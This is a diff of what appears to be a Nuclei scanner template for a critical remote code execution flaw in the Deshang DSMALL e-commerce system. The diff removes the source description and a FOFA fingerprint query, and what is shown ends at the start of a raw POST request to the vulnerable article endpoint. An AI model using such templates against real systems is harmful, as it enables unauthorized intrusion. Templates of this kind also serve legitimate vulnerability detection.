@@ -3,12 +3,8 @@ info:
   name: 德尚网络电商系统article存在远程代码执行漏洞
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/we3fn9zhbzsg5o5w'
+  description: ''
   tags: rce,2026
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: we3fn9zhbzsg5o5w
-    fofa: app="DESHANG-DSMALL"
 http:
 - raw:
   - 'POST /index.php?s=home/article/index HTTP/1.1
